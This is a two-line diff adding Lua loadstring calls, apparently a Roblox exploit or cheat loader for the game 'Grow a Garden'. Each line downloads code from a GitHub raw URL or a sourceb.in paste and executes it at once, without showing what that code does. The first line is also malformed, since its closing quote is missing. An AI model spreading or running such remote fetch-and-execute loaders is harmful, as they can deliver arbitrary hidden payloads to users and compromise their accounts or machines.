@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/noobneil1/Grow-a-garden/refs/heads/main/GrowaGarden))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FohSNI8U1j/0", true))()
